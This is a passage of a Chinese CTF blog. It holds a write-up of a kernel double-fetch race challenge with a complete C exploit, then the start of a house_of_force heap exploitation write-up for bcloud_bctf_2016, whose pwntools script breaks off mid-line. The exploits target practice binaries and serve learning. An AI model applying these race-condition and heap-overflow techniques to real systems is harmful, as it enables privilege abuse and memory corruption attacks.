<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_25</span><span class="params">(__int64 a1, <span class="keyword">int</span> a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-54h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 == <span class="number">0x6666</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    printk(<span class="string">&quot;Your flag is at %px! But I don&#x27;t think you know it&#x27;s content\n&quot;</span>, flag);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( a2 == <span class="number">0x1337</span></span><br><span class="line">         &amp;&amp; !_chk_range_not_ok(a3, <span class="number">0x10</span>LL, *(_QWORD *)(__readgsqword((<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;current_task) + <span class="number">0x1358</span>))</span><br><span class="line">         &amp;&amp; !_chk_range_not_ok(</span><br><span class="line">               *(_QWORD *)a3,</span><br><span class="line">               *(<span class="keyword">int</span> *)(a3 + <span class="number">8</span>),</span><br><span class="line">               *(_QWORD *)(__readgsqword((<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;current_task) + <span class="number">0x1358</span>))</span><br><span class="line">         &amp;&amp; *(_DWORD *)(a3 + <span class="number">8</span>) == <span class="built_in">strlen</span>(flag) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(flag); ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(_BYTE *)(*(_QWORD *)a3 + i) != flag[i] )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">22LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    printk(<span class="string">&quot;Looks like the flag is not a secret anymore. So here is it %s\n&quot;</span>, flag);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">14LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中调用了<code>_chk_range_not_ok</code>函数如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">bool</span> __fastcall _chk_range_not_ok(__int64 a1, __int64 a2, <span class="keyword">unsigned</span> __int64 a3)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">bool</span> v3; <span class="comment">// cf</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// rdi</span></span><br><span class="line"></span><br><span class="line">  v3 = __CFADD__(a2, a1);</span><br><span class="line">  v4 = a2 + a1;</span><br><span class="line">  <span class="keyword">return</span> v3 || a3 &lt; v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>主函数就是当ioctl的操作数为0x6666时输出flag的地址</p>
<p>0x1337很明显是用来比较flag的，从这一块for循环可以看出<code>*a3</code>就是flag的指针，0x7ffffffff000</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(flag); ++i )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)(*(_QWORD *)a3 + i) != flag[i] )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">22LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>而从前面的判断中可以知道<code>*(_DWORD *)(a3 + 8)</code>是flag的长度（4个字节）</p>
<p>那么可知传入的a3应该类似结构体</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">suc</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">char</span> *flag;</span><br><span class="line">    <span class="keyword">int</span> len;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>这题的条件竞争原理是线程1通过了前面的check（传进去的指针指向用户态），线程2把指针改成指向内核空间的flag。</p>
<p>接下来是我的理解：虽然线程1只能够通过前面的check（地址check），线程2只能够通过后面的check（flag check），但是问题就在于两个线程之间存在碰撞，只要两个线程不断地运行，那么总有一个时间点是<strong>线程1通过了前面的check，在准备进行后面的check的时候，线程2把那个要用到的指针给改了</strong>，此时内核再回来取用户态的flag指针，实际上拿到的是被修改之后的指针，相当于内核空间中的flag跟自己比较，那么当然就能够通过比较从而输出flag了</p>
<p>那么现在的问题就是具体应该怎么做呢？</p>
<ol>
<li><p>首先肯定先要拿到内核空间中flag的地址，这部分很简单</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> fd = open(<span class="string">&quot;/dev/baby&quot;</span>,<span class="number">0</span>);</span><br><span class="line">ioctl(fd,<span class="number">0x6666</span>);</span><br><span class="line">system(<span class="string">&quot;dmesg | grep flag &gt; /tmp/tmp.txt&quot;</span>);</span><br><span class="line"><span class="keyword">int</span> fp = open(<span class="string">&quot;/tmp/tmp.txt&quot;</span>);</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">0x1001</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">char</span> *flag_addr = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span> (!read(fp,buf,<span class="number">0x1000</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;read ERR&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">flag_addr = <span class="built_in">strstr</span>(<span class="string">&quot;Your flag is at &quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!flag_addr)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ERR&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    flag_addr += <span class="number">16</span>;</span><br><span class="line">    addr = strtoull(flag_addr,<span class="literal">NULL</span>,<span class="number">16</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+]flag_addr = %p&quot;</span>,addr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在内核中输出flag地址之后用dmesg将输出重定向到一个文件里（方便查找），然后再从该文件里找到flag地址，用<code>strtoull()</code>函数将字符串转成16进制</p>
</li>
<li><p>拿到内核中的flag地址之后就可以利用条件竞争了，新开一个线程，不断将传入的flag指针改成内核flag地址，同时程序本身的线程不断将正常的flag地址传进去，这部分还是意会更简单一点。</p>
</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">suct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">char</span> *flag;</span><br><span class="line">	<span class="keyword">int</span> len;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> finish = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> *flag_addr = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> addr = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">change_flag</span><span class="params">(struct suct *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">while</span>(finish == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		s-&gt;flag = addr;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">pthread_t</span> thread2;</span><br><span class="line">	setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">	setvbuf(<span class="built_in">stdin</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">	setvbuf(<span class="built_in">stderr</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">int</span> fd = open(<span class="string">&quot;/dev/baby&quot;</span>,<span class="number">0</span>);</span><br><span class="line">	<span class="comment">//find kernel flag_addr</span></span><br><span class="line">	ioctl(fd,<span class="number">0x6666</span>);</span><br><span class="line">	system(<span class="string">&quot;dmesg | grep flag &gt; /tmp/tmp.txt&quot;</span>);</span><br><span class="line">	<span class="keyword">int</span> fp = open(<span class="string">&quot;/tmp/tmp.txt&quot;</span>,<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">0x1001</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="keyword">if</span> (!read(fp,buf,<span class="number">0x1000</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;ERROR&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	flag_addr = <span class="built_in">strstr</span>(buf,<span class="string">&quot;Your flag is at &quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (!flag_addr)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;ERROR&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		flag_addr += <span class="number">16</span>;</span><br><span class="line">		addr = strtoull(flag_addr,<span class="literal">NULL</span>,<span class="number">16</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[+]flag_addr: %p\n&quot;</span>,addr);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//double fetch</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">suct</span> <span class="title">sct</span>;</span></span><br><span class="line">	sct.flag = buf;</span><br><span class="line">	sct.len = <span class="number">33</span>;</span><br><span class="line">	pthread_create(&amp;thread2,<span class="literal">NULL</span>,change_flag,&amp;sct);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">0x1000</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		ioctl(fd,<span class="number">0x1337</span>,&amp;sct);</span><br><span class="line">		sct.flag = buf;</span><br><span class="line">	&#125;</span><br><span class="line">	finish = <span class="number">1</span>;</span><br><span class="line">	pthread_join(thread2,<span class="literal">NULL</span>);</span><br><span class="line">	close(fd);</span><br><span class="line">	close(fp);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;the result:\n&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;dmesg |grep flag&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="入门题level4"><a href="#入门题level4" class="headerlink" title="入门题level4"></a>入门题level4</h3><p>内核堆喷</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/06/08/house-of-force/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CharonPt的Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/06/08/house-of-force/" class="post-title-link" itemprop="url">house_of_force</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-06-08 20:38:54" itemprop="dateCreated datePublished" datetime="2022-06-08T20:38:54+08:00">2022-06-08</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-06-10 14:22:27" itemprop="dateModified" datetime="2022-06-10T14:22:27+08:00">2022-06-10</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="bcloud-bctf-2016"><a href="#bcloud-bctf-2016" class="headerlink" title="bcloud_bctf_2016"></a>bcloud_bctf_2016</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>checksec</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<p>这是道32位的题目，环境是glibc-2.23</p>
<p>首先贴本题出现off-by-null漏洞的输入函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">my_read</span><span class="params">(<span class="keyword">int</span> ptr, <span class="keyword">int</span> len, <span class="keyword">char</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+1Bh] [ebp-Dh] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; len; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( read(<span class="number">0</span>, &amp;buf, <span class="number">1u</span>) &lt;= <span class="number">0</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( buf == a3 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *(ptr + i) = buf;</span><br><span class="line">  &#125;</span><br><span class="line">  *(i + ptr) = <span class="number">0</span>;	<span class="comment">//off-by-null</span></span><br><span class="line">  <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在程序的开始时要求输入usr_name</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">sub_80487A1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+1Ch] [ebp-5Ch] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// [esp+5Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+6Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x50</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your name:&quot;</span>);</span><br><span class="line">  my_read(s, <span class="number">0x40</span>, <span class="number">10</span>);</span><br><span class="line">  v2 = <span class="built_in">malloc</span>(<span class="number">0x40</span>u);</span><br><span class="line">  name_chunk = v2;</span><br><span class="line">  <span class="built_in">strcpy</span>(v2, s);</span><br><span class="line">  sub_8048779(v2);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里就有一个问题，仔细观察局部变量的空间就知道s的截断符被放到了v2中，那么接下来<code>v2 = malloc(0x40u);</code>就会把s的截断符覆盖掉。那么在<code>strcpy(v2, s);</code>这行代码中实际上拷贝到v2中的就相当于<code>s + chunk_addr</code>（注意canary跟v2并不相连，同时经过调试发现跟v2往后几块栈上的数据都为0，所以拷贝到v2就截止了），这里其实还因为strcpy的问题将top chunk size的最低一位给盖成了’’\x00’，但是这并不影响</p>
<p>输入usr_name这里的洞让我们得到了堆地址，接下来还要输入两个东西</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">sub_804884E</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> ptr1[<span class="number">64</span>]; <span class="comment">// [esp+1Ch] [ebp-9Ch] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// [esp+5Ch] [ebp-5Ch]</span></span><br><span class="line">  <span class="keyword">char</span> ptr2[<span class="number">68</span>]; <span class="comment">// [esp+60h] [ebp-58h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> *v1; <span class="comment">// [esp+A4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [esp+ACh] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(ptr1, <span class="number">0</span>, <span class="number">0x90</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Org:&quot;</span>);</span><br><span class="line">  my_read(ptr1, <span class="number">0x40</span>, <span class="number">10</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Host:&quot;</span>);</span><br><span class="line">  my_read(ptr2, <span class="number">0x40</span>, <span class="number">10</span>);</span><br><span class="line">  v1 = <span class="built_in">malloc</span>(<span class="number">0x40</span>u);</span><br><span class="line">  v2 = <span class="built_in">malloc</span>(<span class="number">0x40</span>u);</span><br><span class="line">  org_chunk = v2;</span><br><span class="line">  host_chunk = v1;</span><br><span class="line">  <span class="built_in">strcpy</span>(v1, ptr2);</span><br><span class="line">  <span class="built_in">strcpy</span>(v2, ptr1);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;OKay! Enjoy:)&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟前面一样的问题，v2会把prt1的截断符盖掉，同时因为这是32位的程序，v2的四个字节中也没有截断符，而且v2跟prt2是相连的，所以在<code>strcpy(v2, ptr1);</code>这里，拷贝到v2中的内容实际上就是<code>ptr1 + v2 + ptr2</code>，而因为prt2有68个字节，所以<code>strcpy(v1, ptr2);</code>这里不会有问题。</p>
<p>那么显然最后从ptr2开始就会把top chunk的size以及之后的内容盖掉，这里就能用这个洞修改top chunk的size。</p>
<p>接下来就是add功能函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+18h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> size; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">9</span> &amp;&amp; heap[i]; ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( i == <span class="number">10</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Lack of space. Upgrade your account with just $100 :)&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input the length of the note content:&quot;</span>);</span><br><span class="line">  size = sub_8048709();</span><br><span class="line">  heap[i] = <span class="built_in">malloc</span>(size + <span class="number">4</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !heap[i] )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  Size[i] = size;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input the content:&quot;</span>);</span><br><span class="line">  my_read(heap[i], size, <span class="number">10</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Create success, the id is %d\n&quot;</span>, i);</span><br><span class="line">  result = i;</span><br><span class="line">  dword_804B0E0[i] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>除此之外还有edit和free功能函数，都很常规而且没有洞，所以不贴了</p>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>由前面的分析可以知道我们能够得到堆地址，以及能修改top chunk的size，并且在add功能函数中我们可以申请任意大小堆块，以上三个就是house_of_force的利用条件，还需要注意的是在glibc-2.23—2.27中都不存在对top chunk size域合法性的检测，所以可以使用house_of_force，但是似乎从2.29开始就新增这个检测了（我也没仔细看过所以不好说）</p>
<p>在输入usr_name的时候得到了栈地址，然后在输入Org跟Host的时候可以利用前面讲的溢出盖掉top chunk的size，将其改成<code>0xffffffff</code>之后，我们后续的内存申请就都发生在top chunk中，然后因为申请chunk时没有对size进行检查，所以可以申请一个负数，导致得到的chunk出现在.bss段，这样就控制了数据段上的堆指针，完成任意地址写。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">p.sendafter(<span class="string">&quot;name:&quot;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">heap_base = u32(p.recv(<span class="number">4</span>)) - <span class="number">8</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(heap_base)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;Org:&quot;</span>,<span class="string">&#x27;a&#x27;</span>*<span 